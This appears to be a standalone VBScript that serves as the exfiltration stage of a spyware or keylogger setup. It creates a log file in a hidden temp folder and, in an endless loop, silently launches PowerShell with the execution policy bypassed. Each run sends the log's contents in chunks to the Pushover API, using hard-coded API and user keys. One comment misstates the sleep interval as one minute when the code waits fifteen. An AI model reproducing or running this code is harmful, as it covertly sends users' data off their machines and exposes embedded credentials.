Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Define the TEMP folder path
tempPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\new"
If Not objFSO.FolderExists(tempPath) Then
    objFSO.CreateFolder(tempPath)
End If

logFile = tempPath & "\log.txt"

' Create log.txt if it does not exist (only runs once)
If Not objFSO.FileExists(logFile) Then
    Set objFile = objFSO.CreateTextFile(logFile, True)
    objFile.WriteLine "Log file created on: " & Now
    objFile.Close
End If

Do
    ' Define PowerShell script (only this part loops)
    psCommand = "powershell -ExecutionPolicy Bypass -NoProfile -Command " & _ 
        """$API_TOKEN='a7apgvyetoayv26hfoh15t11axi6mp'; " & _ 
        "$USER_KEY='u2m1rdameavmjmg6abkauqy6ejdqk7'; " & _ 
        "$FILE_PATH=[System.IO.Path]::Combine($env:TEMP,'new','log.txt'); " & _ 
        "if (-Not (Test-Path $FILE_PATH)) {exit}; " & _ 
        "$MESSAGE = Get-Content $FILE_PATH -Raw; $MAX_LENGTH = 1024; " & _ 
        "while ($MESSAGE.Length -gt 0) { " & _ 
        "$CHUNK = $MESSAGE.Substring(0, [Math]::Min($MAX_LENGTH, $MESSAGE.Length)); " & _ 
        "Invoke-RestMethod -Uri 'https://api.pushover.net:443/1/messages.json' " & _ 
        "-Method Post -Body @{token=$API_TOKEN; user=$USER_KEY; message=$CHUNK}; " & _ 
        "$MESSAGE = $MESSAGE.Substring($CHUNK.Length)}; exit"""

    ' Run the PowerShell command (silent mode)
    objShell.Run "cmd /c " & psCommand, 0, True

    ' Wait for 1 minute (60,000 milliseconds)
    WScript.Sleep 900000

Loop
